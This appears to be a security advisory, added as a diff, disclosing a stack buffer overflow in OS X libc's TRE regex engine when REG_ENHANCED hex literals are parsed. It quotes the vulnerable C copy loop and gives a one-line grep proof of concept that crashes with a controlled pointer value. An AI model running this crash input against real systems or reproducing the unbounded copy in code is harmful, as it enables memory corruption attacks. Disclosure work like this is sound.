@@ -1,0 +1,34 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=428
+
+OS X Libc uses the slightly obscure TRE regex engine [ http://laurikari.net/tre/ ]
+
+If used in enhanced mode (by passing the REG_ENHANCED flag to regcomp) TRE supports arbitrary-width hex literals. Here is the code used to parse them:
+
+  /* Wide char. */
+  char tmp[32];
+  long val;
+  int i = 0;
+  ctx->re++;
+  while (ctx->re_end - ctx->re >= 0)
+    {
+      if (ctx->re[0] == CHAR_RBRACE)
+        break;
+      if (tre_isxdigit_l(ctx->re[0], ctx->loc))
+        {
+    tmp[i] = (char)ctx->re[0];
+    i++;
+    ctx->re++;
+    continue;
+        }
+      return REG_EBRACE;
+    }
+
+ctx->re points to the regex characters. This code blindly copies hex characters from the regex into the 32 byte stack buffer tmp until it encounters either a non-hex character or a '}'...
+
+I'm still not sure exactly what's compiled with REG_ENHANCED but at least grep is; try this PoC on an OS X machine:
+
+lldb -- grep "\\\\x{`perl -e 'print "A"x1000;'`}" /bin/bash
+
+That should crash trying to read and write pointers near 0x4141414141414141
+
+Severity Medium because I still need to find either a priv-esc or remote context in which you can control the regex when REG_ENHANCED is enabled.
